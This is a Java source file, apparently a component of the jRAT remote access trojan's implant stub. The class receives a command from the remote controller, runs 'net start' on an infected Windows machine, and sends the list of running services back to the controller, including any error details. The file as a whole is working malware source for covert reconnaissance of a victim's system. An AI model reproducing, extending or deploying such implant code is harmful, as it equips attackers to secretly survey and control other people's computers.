package se.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet52WindowsService;

import com.redpois0n.oslib.OperatingSystem;


public class Packet77ListServices extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec("net start");
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					if (line.startsWith(" ")) {
						Connection.instance.addToSendQueue(new Packet52WindowsService(line.trim()));
					}
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.instance.addToSendQueue(new Packet52WindowsService("Error starting \"net start\" process: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
